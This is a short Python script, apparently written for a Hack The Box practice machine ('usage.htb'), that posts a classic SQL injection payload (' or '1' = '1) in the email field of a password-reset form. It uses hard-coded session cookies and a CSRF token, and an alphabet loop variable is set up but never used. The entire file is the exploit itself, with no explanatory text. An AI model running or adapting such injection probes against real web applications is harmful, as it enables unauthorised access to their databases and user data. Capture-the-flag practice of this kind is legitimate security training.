import json
import requests

def sql_injection():
    alphabet_index = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    headers = {
        "Cookie": "XSRF-TOKEN=eyJpdiI6InBWVzMyR29EUUtGbFR6N1dka2ZGR2c9PSIsInZhbHVlIjoiUnkzRW5jQXkwRjlWZUwzQnU2cVhuaHFNK0Y3S2VEZ1ZHMVkrWVFtOVdCYm43cWtpcmdsOVlvOC9JaWhOL1k2RHJXTXgva2UrSWlXR2dFZnBnWTdYTm1XaFQ2ZnFiNGVLSy9PYllIa0NBVS9IWFVVaUlJdEdIdW8ydjI2Q2lncFgiLCJtYWMiOiI3Y2JjMTcwMWVkN2FlMzFkZDdmMmFkNDdhYWE4ZWFhZDZlNDg5NzIwNjcyMzU4YTgwOTY2NGRlYWFhYmVhODdlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InJHMmNTTlQ5MTdVRTdmVkNDZDFtUEE9PSIsInZhbHVlIjoibHgzT3djTTZqRlM3bjg5YjBJcFRyZi9qZ056Y1dvc0o4aFNvK25WUENTL2ErV01LU0lhT2xvVE1UTFRjU3oyV2FBbWxUZWJUTFFaU1krcVdaWG9YSTBTUjRVLzBUc0tvUlNQZGhUV2cwbUtBSUZ2QWVBOG9ZWDl0dGNCNUwxSFgiLCJtYWMiOiI1YTIyZTU4MDY3OTZmMGU0OWE3ZDZiYzRmMTdmMzY4ZjdlYWUxNTQzMGVjYzFkYjE5MzA2YjZlNDM2MGQ3M2JjIiwidGFnIjoiIn0%3D"
    }
    payload = "idk@gmail.com' or '1' = '1"
    data = {
        "_token": "nXEA3hPbOrGRjPox0DrszpaM5nDMFdXH99vPIRGA",
        "email": payload
    }

    r = requests.post("http://usage.htb/forget-password", headers=headers, data=data)

    print(r.status_code)
    try:
        print(json.loads(r.text))
    except json.JSONDecodeError:
        print(r.text)

if __name__ == "__main__":
    sql_injection()



